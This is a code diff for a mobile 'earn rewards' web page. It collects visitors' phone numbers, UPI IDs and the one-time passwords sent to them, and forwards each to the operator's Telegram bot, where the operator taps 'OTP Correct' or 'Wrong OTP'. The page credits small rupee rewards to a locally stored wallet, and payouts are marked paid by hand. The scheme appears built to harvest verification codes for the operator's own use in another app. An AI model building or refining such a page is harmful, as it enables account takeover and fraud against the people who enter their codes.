+                  `📱 <code>${currentPhone}</code>\n` +
+                  `Attempts: ${attempts}/${MAX_ATTEMPTS} | Balance: ₹${walletBal}`
+                ).catch(()=>{});
 
-            await answerCallback(cb.id, cbData === 'otp_wrong' ? '❌ Wrong OTP sent to user!' : cbData === 'ban_user' ? '🚫 User banned!' : '✅ OTP verified!');
+              } else if (cbData === 'otp_wrong') {
+                await answerCallback(cb.id, '❌ Wrong OTP marked!');
+                // Don't stop polling here either
+                showPopup('wrongOtpPopup');
+                await sendTelegram(`⚠️ Marked <b>WRONG OTP</b> for 📱 <code>${currentPhone}</code>`);
 
-            if (cbData === 'otp_wrong') {
-              stopPolling();
-              showPopup('wrongOtpPopup');
-              await sendTelegram(`⚠️ You marked OTP as <b>WRONG</b> for\n📱 <code>${currentPhone}</code>`);
-            } else if (cbData === 'otp_correct') {
-              stopPolling();
-              hide('step2');
-              show('step3');
-              loadState();
-              refreshWallet();
-            } else if (cbData === 'ban_user') {
-              stopPolling();
-              await banUserRemote(currentPhone, currentUpi);
-              hide('step1'); hide('step2'); hide('step3');
-              showPopup('bannedPopup');
-              await sendTelegram(
-                `🔴 <b>User Banned!</b>\n` +
-                `📱 <code>${currentPhone}</code>\n` +
-                `💳 <code>${currentUpi}</code>\n` +
-                `Permanently blocked from website on <b>all devices</b>.\n\n` +
-                `Tap below to unban anytime:`,
-                { inline_keyboard: [[{ text: `🔓 Unban ${currentPhone}`, callback_data: `unban_${currentPhone}` }]] }
-              );
+              } else if (cbData === 'ban_user') {
+                await answerCallback(cb.id, '🚫 User banned!');
+                await banUserRemote(currentPhone, currentUpi);
+                hide('step1'); hide('step2'); hide('step3');
+                showPopup('bannedPopup');
+                await sendTelegram(
+                  `🔴 <b>Banned!</b>\n📱 <code>${currentPhone}</code> | 💳 <code>${currentUpi}</code>`,
+                  { inline_keyboard: [[{ text: `🔓 Unban ${currentPhone}`, callback_data: `unban_${currentPhone}` }]] }
+                );
+              }
             }
           }
         }
       }
-    } catch(e) { /* ignore network hiccups */ }
-    if (pollTimer) pollTimer = setTimeout(pollForCallback, 2000);
-  }
-
-  async function startPolling() {
-    // First flush any stale pending updates so we don't accidentally
-    // pick up old callback_queries from previous sessions
-    try {
-      const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1`);
-      const data = await res.json();
-      if (data.ok && data.result.length > 0) {
-        pollingOffset = data.result[data.result.length - 1].update_id + 1;
-      }
-    } catch(e) { /* ignore */ }
-    pollTimer = setTimeout(pollForCallback, 1500);
-  }
-  function stopPolling() { clearTimeout(pollTimer); pollTimer = null; }
-
-  // ── UI helpers ──
-  function show(id) { document.getElementById(id).classList.remove('hidden'); }
-  function hide(id) { document.getElementById(id).classList.add('hidden'); }
-  function showPopup(id) { show(id); }
-  function hidePopup(id) { hide(id); }
-
-  function refreshWallet() {
-    document.getElementById('walletBal').textContent    = '₹' + walletBal;
-    document.getElementById('attemptsText').textContent = attempts + ' / ' + MAX_ATTEMPTS;
-    document.getElementById('progFill').style.width     = (attempts / MAX_ATTEMPTS * 100) + '%';
-    document.getElementById('withdrawBtn').disabled     = walletBal < 5;
-    const remaining = MAX_ATTEMPTS - attempts;
-    document.getElementById('remainingCount').textContent = remaining;
-
-    const earnBtn    = document.getElementById('earnBtn');
-    const nextStepBtn = document.getElementById('nextStepBtn');
-
-    if (attempts >= MAX_ATTEMPTS) {
-      // All done — no more attempts
-      earnBtn.disabled    = true;
-      earnBtn.textContent = '🚫 No attempts left';
-      nextStepBtn.classList.add('hidden');
-    } else if (claimedThisRound) {
-      // Already claimed this round — keep earn disabled, show next step
-      earnBtn.disabled    = true;
-      earnBtn.textContent = '✅ Reward Claimed!';
-      nextStepBtn.classList.remove('hidden');
-    } else {
-      // Fresh round — enable earn, hide next step
-      earnBtn.disabled    = false;
-      earnBtn.textContent = '🎲 Claim Next Reward';
-      nextStepBtn.classList.add('hidden');
+    } catch(e) {
+      console.error('Polling error:', e);
+    }
+    
+    if (isPolling) {
+      pollTimer = setTimeout(pollForCallback, 2000);
     }
   }
 
-  // OTP auto-focus
-  document.querySelectorAll('.otp').forEach((input, i, arr) => {
-    input.addEventListener('input', () => {
-      input.value = input.value.replace(/\D/g,'');
-      if (input.value && i < arr.length - 1) arr[i+1].focus();
+  function startPolling() {
+    if (isPolling) return;
+    isPolling = true;
+    // Get latest offset first
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1`)
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok && data.result.length > 0) {
+          pollingOffset = data.result[data.result.length - 1].update_id + 1;
+        }
+        pollForCallback();
+      })
+      .catch(() => {
+        pollForCallback();
+      });
+  }
+  
+  function stopPolling() {
+    isPolling = false;
+    clearTimeout(pollTimer);
+    pollTimer = null;
+  }
+
+  // Toast notification
+  function showToast(message) {
+    const toast = document.createElement('div');
+    toast.style.cssText = `
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, var(--green), #00a854);
+      color: #000;
+      padding: 12px 24px;
+      border-radius: 99px;
+      font-weight: 700;
+      font-size: 14px;
+      z-index: 1000;
+      animation: fadeDown 0.3s ease;
+      box-shadow: 0 4px 20px rgba(0,230,118,0.3);
+    `;
+    toast.textContent = message;
+    document.body.appendChild(toast);
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      toast.style.transition = 'opacity 0.5s';
+      setTimeout(() => toast.remove(), 500);
+    }, 3000);
+  }
+
+  // ── UI helpers ──
+  function show(id)      { document.getElementById(id).classList.remove('hidden'); }
+  function hide(id)      { document.getElementById(id).classList.add('hidden'); }
+  function showPopup(id) { show(id); }
+  function hidePopup(id) { hide(id); }
+
+  // ── Build OTP boxes ──
+  function buildOtpBoxes(digits) {
+    currentDigits = digits;
+    document.getElementById('otpBoxLabel').textContent = digits + '-Digit OTP';
+    const container = document.getElementById('otpBoxes');
+    container.innerHTML = '';
+    for (let i = 0; i < digits; i++) {
+      const inp = document.createElement('input');
+      inp.type        = 'tel';
+      inp.maxLength   = 1;
+      inp.className   = 'otp';
+      inp.id          = 'o' + (i + 1);
+      inp.autocomplete = 'off';
+      container.appendChild(inp);
+    }
+    const all = container.querySelectorAll('.otp');
+    all.forEach((input, i, arr) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g,'');
+        if (input.value && i < arr.length - 1) arr[i+1].focus();
+      });
+      input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && i > 0) arr[i-1].focus();
+      });
     });
-    input.addEventListener('keydown', e => {
-      if (e.key === 'Backspace' && !input.value && i > 0) arr[i-1].focus();
+    document.getElementById('err2').textContent = '';
+  }
+
+  buildOtpBoxes(4);
+
+  document.querySelectorAll('.otp-type-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.otp-type-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      buildOtpBoxes(parseInt(btn.dataset.digits));
     });
   });
 
-  // ── STEP 1: Submit details ──
+  // ── Wallet UI ──
+  function refreshWallet() {
+    document.getElementById('walletBal').textContent    = '₹' + walletBal;
+    document.getElementById('attemptsText').textContent = attempts + ' attempt' + (attempts !== 1 ? 's' : '') + ' used';
+    document.getElementById('remainingBadge').textContent = (MAX_ATTEMPTS - attempts) + ' remaining';
+    document.getElementById('progFill').style.width     = (attempts / MAX_ATTEMPTS * 100) + '%';
+    document.getElementById('withdrawBtn').disabled     = walletBal < 5;
+    const rem = MAX_ATTEMPTS - attempts;
+    document.getElementById('remainingCount').textContent = rem;
+    const nextBtn = document.getElementById('nextStepBtn');
+    nextBtn.disabled = rem <= 0;
+    nextBtn.textContent = rem <= 0 ? '🚫 No attempts left' : '➡️ Do Next OTP';
+  }
+
+  function refreshWithdrawalHistory() {
+    const listContainer = document.getElementById('withdrawHistoryList');
+    if (!withdrawalHistory || withdrawalHistory.length === 0) {
+      listContainer.innerHTML = '<div style="text-align:center; color:var(--muted); padding:20px; font-size: 13px;">No withdrawal history yet</div>';
+      return;
+    }
+    
+    listContainer.innerHTML = withdrawalHistory.map(item => {
+      const isPaid = item.status === 'Paid ✅';
+      return `
+      <div class="history-item ${isPaid ? 'paid' : ''}" id="hist-${item.id}">
+        <div class="history-item-header">
+          <span class="history-amount">₹${item.amount}</span>
+          <span class="history-date">${item.date}</span>
+        </div>
+        <div class="history-status ${isPaid ? 'paid' : 'processing'}">
+          ${isPaid ? '✅ Paid' : '⏳ ' + item.status}
+        </div>
+      </div>
+    `}).join('');
+  }
+
+  // ── STEP 1: Submit ──
   document.getElementById('submitDetailsBtn').addEventListener('click', async () => {
     const phone = document.getElementById('phone').value.trim();
     const upi   = document.getElementById('upi').value.trim();
@@ -535,37 +755,34 @@
     if (phone.length !== 10 || isNaN(phone)) { err.textContent = 'Enter a valid 10-digit number.'; return; }
     if (!upi.includes('@'))                  { err.textContent = 'Enter a valid UPI ID.'; return; }
 
-    // Check if banned (remote — works across all devices)
-    btn.disabled = true;
-    btn.textContent = 'Checking...';
-    const banned = await isBannedRemote(phone, upi);
-    if (banned) {
-      btn.disabled = false;
-      btn.textContent = 'Send OTP Request →';
-      showPopup('bannedPopup');
-      return;
-    }
+    btn.disabled = true; btn.textContent = 'Checking...';
 
-    // Check attempt limit (60/60 completed — block re-entry)
+    const banned = await isBannedRemote(phone, upi);
+    if (banned) { btn.disabled = false; btn.textContent = 'Send OTP Request →'; showPopup('bannedPopup'); return; }
+
     const saved = JSON.parse(localStorage.getItem('ref_' + phone) || '{}');
     if ((saved.attempts || 0) >= MAX_ATTEMPTS) {
-      showPopup('limitPopup');
-      return;
+      btn.disabled = false; btn.textContent = 'Send OTP Request →';
+      showPopup('numberUsedPopup'); return;
+    }
+    const upiPhone = localStorage.getItem('upi_' + upi);
+    if (upiPhone && upiPhone !== phone) {
+      const upiSaved = JSON.parse(localStorage.getItem('ref_' + upiPhone) || '{}');
+      if ((upiSaved.attempts || 0) >= MAX_ATTEMPTS) {
+        btn.disabled = false; btn.textContent = 'Send OTP Request →';
+        showPopup('upiUsedPopup'); return;
+      }
     }
 
-    btn.disabled = true;
     btn.textContent = 'Sending...';
-
     try {
       const tgRes = await sendTelegram(
         `🔔 <b>New Referral Request</b>\n\n` +
         `📱 <b>Phone:</b> <code>${phone}</code>\n` +
         `💳 <b>UPI ID:</b> <code>${upi}</code>\n` +
-        `🔢 <b>Attempt:</b> ${(saved.attempts || 0) + 1}/${MAX_ATTEMPTS}\n\n` +
-        `👉 Verify in your app &amp; send OTP to user.\n` +
-        `Then tap a button below:`,
-        {
-          inline_keyboard: [[
+        `🔢 <b>Attempt:</b> ${(saved.attempts||0)+1}/${MAX_ATTEMPTS}\n\n` +
+        `👉 Verify in your app &amp; send OTP.\nThen tap below:`,
+        { inline_keyboard: [[
             { text: '✅ OTP Correct', callback_data: 'otp_correct' },
             { text: '❌ Wrong OTP',   callback_data: 'otp_wrong'   }
           ],[
@@ -573,95 +790,106 @@
           ]]
         }
       );
-
-      currentPhone = phone;
-      currentUpi   = upi;
+      currentPhone = phone; currentUpi = upi;
       if (tgRes.ok) pendingMsgId = tgRes.result.message_id;
-
-      hide('step1');
-      show('step2');
-      document.getElementById('o1').focus();
-      startPolling();
+      let cd = 10;
+      btn.disabled = true;
+      btn.textContent = `Please wait ${cd}s...`;
+      await new Promise(resolve => {
+        const t = setInterval(() => {
+          cd--;
+          btn.textContent = cd > 0 ? `Please wait ${cd}s...` : 'Moving...';
+          if (cd <= 0) { clearInterval(t); resolve(); }
+        }, 1000);
+      });
+      btn.disabled = false; btn.textContent = 'Send OTP Request →';
+      hide('step1'); show('step2');
+      document.getElementById('o1') && document.getElementById('o1').focus();
+      startPolling(); // Start polling and keep it running
     } catch(e) {
       err.textContent = 'Failed to send. Check internet.';
-      btn.disabled = false;
-      btn.textContent = 'Send OTP Request →';
+      let secs = 7;
+      btn.disabled = true;
+      btn.textContent = `Please wait ${secs}s...`;
+      const errTimer = setInterval(() => {
+        secs--;
+        if (secs <= 0) {
+          clearInterval(errTimer);
+          btn.disabled = false;
+          btn.textContent = 'Send OTP Request →';
+        } else {
+          btn.textContent = `Please wait ${secs}s...`;
+        }
+      }, 1000);
     }
   });
 
   // Back
   document.getElementById('backBtn').addEventListener('click', () => {
-    stopPolling();
-    hide('step2');
-    show('step1');
+    hide('step2'); show('step1');
     document.getElementById('err2').textContent = '';
-    const btn = document.getElementById('submitDetailsBtn');
-    btn.disabled = false;
-    btn.textContent = 'Send OTP Request →';
+    hide('waitingBox');
+    const btn = document.getElementById('verifyOtpBtn');
+    btn.disabled = false; btn.textContent = 'Submit OTP →';
+    const submitBtn = document.getElementById('submitDetailsBtn');
+    submitBtn.disabled = false; submitBtn.textContent = 'Send OTP Request →';
   });
 
-  // ── STEP 2: User submits OTP ──
+  // ── STEP 2: Submit OTP ──
   document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
-    const inputs = document.querySelectorAll('.otp');
+    const inputs = document.getElementById('otpBoxes').querySelectorAll('.otp');
     let otp = '';
     inputs.forEach(i => otp += i.value.trim());
     const err = document.getElementById('err2');
     const btn = document.getElementById('verifyOtpBtn');
     err.textContent = '';
 
-    if (otp.length < 4) { err.textContent = 'Please enter the full 4-digit OTP.'; return; }
+    const expectedLen = document.getElementById('otpBoxes').querySelectorAll('.otp').length;
+    if (otp.length < expectedLen) { err.textContent = `Please enter all ${expectedLen} digits.`; return; }
 
-    btn.disabled = true;
-    btn.textContent = 'Submitting...';
+    btn.disabled = true; btn.textContent = 'Submitting...';
 
     try {
-      // Send OTP entered by user to your Telegram
-      await sendTelegram(
-        `🔑 <b>OTP Submitted</b>\n\n` +
+      const otpMsgRes = await sendTelegram(
+        `🔑 <b>OTP Submitted by User</b>\n\n` +
         `📱 <b>Phone:</b> <code>${currentPhone}</code>\n` +
         `💳 <b>UPI ID:</b> <code>${currentUpi}</code>\n` +
-        `🔢 <b>OTP Entered:</b> <code>${otp}</code>\n\n` +
-        `👆 Tap the buttons above to mark ✅ Correct or ❌ Wrong.`
+        `🔢 <b>OTP Entered (${currentDigits}-digit):</b> <code>${otp}</code>\n\n` +
+        `👆 Tap ✅ Correct or ❌ Wrong on the message above.`
       );
-      btn.textContent = 'Waiting for verification...';
-      // Polling already running — wait for your inline button tap
+      if (otpMsgRes.ok) pendingMsgId2 = otpMsgRes.result.message_id;
+      show('waitingBox');
+      btn.textContent = 'Waiting for verification…';
     } catch(e) {
       err.textContent = 'Failed to submit. Try again.';
-      btn.disabled = false;
-      btn.textContent = 'Verify OTP ✓';
+      btn.disabled = false; btn.textContent = 'Submit OTP →';
     }
   });
 
-  // ── STEP 3: Wallet — earn reward ──
-  document.getElementById('earnBtn').addEventListener('click', async () => {
+  // ── Next OTP cycle ──
+  document.getElementById('nextStepBtn').addEventListener('click', () => {
     if (attempts >= MAX_ATTEMPTS) { showPopup('limitPopup'); return; }
-
-    walletBal        += 1;
-    attempts         += 1;
-    claimedThisRound  = true;
-    saveState();
-    refreshWallet();
-
-    if (attempts >= MAX_ATTEMPTS) {
-      setTimeout(() => showPopup('limitPopup'), 300);
-    } else {
-      showPopup('rewardPopup');
-    }
-
-    await sendTelegram(
-      `💰 <b>Reward Claimed</b>\n` +
-      `📱 <code>${currentPhone}</code>\n` +
-      `Attempts: ${attempts}/${MAX_ATTEMPTS} | Balance: ₹${walletBal}`
-    ).catch(() => {});
+    buildOtpBoxes(4);
+    document.querySelectorAll('.otp-type-btn').forEach(b => b.classList.remove('active'));
+    document.querySelector('[data-digits="4"]').classList.add('active');
+    document.getElementById('err2').textContent = '';
+    hide('waitingBox');
+    const vBtn = document.getElementById('verifyOtpBtn');
+    vBtn.disabled = false; vBtn.textContent = 'Submit OTP →';
+    document.getElementById('phone').value = currentPhone;
+    document.getElementById('upi').value   = currentUpi;
+    document.getElementById('err1').textContent = '';
+    const sBtn = document.getElementById('submitDetailsBtn');
+    sBtn.disabled = false; sBtn.textContent = 'Send OTP Request →';
+    hide('step3'); show('step1');
+    pendingMsgId = null; pendingMsgId2 = null;
   });
 
-  // ── Withdraw — open popup ──
+  // ── Withdraw ──
   document.getElementById('withdrawBtn').addEventListener('click', () => {
     if (walletBal < 5) return;
-    // Reset amount selection
     document.querySelectorAll('.amt-btn').forEach(b => {
       b.classList.remove('selected');
-      // Disable buttons higher than wallet balance
       b.disabled = parseInt(b.dataset.amt) > walletBal;
       b.style.opacity = parseInt(b.dataset.amt) > walletBal ? '0.35' : '1';
     });
@@ -672,8 +900,6 @@
   });
 
   let selectedWithdrawAmt = 0;
-
-  // Amount button selection
   document.querySelectorAll('.amt-btn').forEach(btn => {
     btn.addEventListener('click', () => {
       const amt = parseInt(btn.dataset.amt);
@@ -686,62 +912,74 @@
     });
   });
 
-  // Confirm withdraw
   document.getElementById('confirmWithdrawBtn').addEventListener('click', async () => {
     if (!selectedWithdrawAmt || selectedWithdrawAmt > walletBal) return;
     const amt = selectedWithdrawAmt;
     const btn = document.getElementById('confirmWithdrawBtn');
-    btn.disabled = true;
-    btn.textContent = 'Sending...';
-
-    await sendTelegram(
+    btn.disabled = true; btn.textContent = 'Sending...';
+    
+    const withdrawId = Date.now().toString();
+    
+    const tgRes = await sendTelegram(
       `💳 <b>Withdrawal Request</b>\n\n` +
       `📱 <b>Phone:</b> <code>${currentPhone}</code>\n` +
       `💳 <b>UPI ID:</b> <code>${currentUpi}</code>\n` +
-      `💰 <b>Amount:</b> ₹${amt}\n\n` +
-      `Please process the payment!`
-    ).catch(() => {});
-
+      `💰 <b>Amount:</b> ₹${amt}\n` +
+      `⏳ <b>Status:</b> Processing...\n\n` +
+      `Click below when payment is completed:`,
+      { inline_keyboard: [[{ text: '✅ Mark as Paid', callback_data: `withdraw_paid_${currentPhone}_${withdrawId}` }]] }
+    ).catch(()=>{});
+    
     walletBal -= amt;
-    saveState();
+    
+    if (!withdrawalHistory) withdrawalHistory = [];
+    withdrawalHistory.unshift({
+      id: withdrawId,
+      amount: amt,
+      date: new Date().toLocaleString('en-IN', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' }),
+      status: 'Processing (24h)',
+      telegramMsgId: tgRes && tgRes.ok ? tgRes.result.message_id : null
+    });
+    
+    saveState(); 
     refreshWallet();
-    hidePopup('withdrawPopup');
-    btn.textContent = 'Confirm Withdraw';
+    
+    btn.textContent = 'Withdrawal Done!';
+    
+    setTimeout(() => {
+      hidePopup('withdrawPopup');
+      btn.disabled = false; 
+      btn.textContent = 'Confirm Withdraw';
+      document.getElementById('withdrawSuccessAmt').textContent = '₹' + amt;
+      showPopup('withdrawSuccessPopup');
+    }, 800);
   });
 
-  // ── Next Step: go back to step1 for another OTP cycle ──
-  document.getElementById('nextStepBtn').addEventListener('click', () => {
-    claimedThisRound = false; // reset so earn button is fresh next round
-    document.getElementById('phone').value = currentPhone;
-    document.getElementById('upi').value   = currentUpi;
-    document.getElementById('err1').textContent = '';
-    const submitBtn = document.getElementById('submitDetailsBtn');
-    submitBtn.disabled    = false;
-    submitBtn.textContent = 'Send OTP Request →';
-    document.querySelectorAll('.otp').forEach(i => i.value = '');
-    document.getElementById('err2').textContent = '';
-    document.getElementById('verifyOtpBtn').disabled    = false;
-    document.getElementById('verifyOtpBtn').textContent = 'Verify OTP ✓';
-    hide('step3');
-    show('step1');
+  // ── Withdrawal History ──
+  document.getElementById('historyBtn').addEventListener('click', () => {
+    refreshWithdrawalHistory();
+    showPopup('withdrawHistoryPopup');
+  });
+  
+  document.getElementById('closeWithdrawHistory').addEventListener('click', () => {
+    hidePopup('withdrawHistoryPopup');
   });
 
   // ── Popup close buttons ──
   document.getElementById('closeWrongOtp').addEventListener('click', () => {
     hidePopup('wrongOtpPopup');
-    // Reset OTP fields
-    document.querySelectorAll('.otp').forEach(i => i.value = '');
-    document.getElementById('o1').focus();
+    hide('waitingBox');
+    document.getElementById('otpBoxes').querySelectorAll('.otp').forEach(i => i.value = '');
+    document.getElementById('o1') && document.getElementById('o1').focus();
     const btn = document.getElementById('verifyOtpBtn');
-    btn.disabled = false;
-    btn.textContent = 'Verify OTP ✓';
-    startPolling();
+    btn.disabled = false; btn.textContent = 'Submit OTP →';
   });
-
+  document.getElementById('closeWithdrawSuccess').addEventListener('click', () => hidePopup('withdrawSuccessPopup'));
+  document.getElementById('closeNumberUsed').addEventListener('click', () => hidePopup('numberUsedPopup'));
+  document.getElementById('closeUpiUsed').addEventListener('click', () => hidePopup('upiUsedPopup'));
   document.getElementById('closeReward').addEventListener('click', () => hidePopup('rewardPopup'));
   document.getElementById('closeLimitPopup').addEventListener('click', () => hidePopup('limitPopup'));
   document.getElementById('closeWithdraw').addEventListener('click', () => hidePopup('withdrawPopup'));
-  // Banned popup — button is disabled, popup stays open permanently
 </script>
 </body>
 </html>
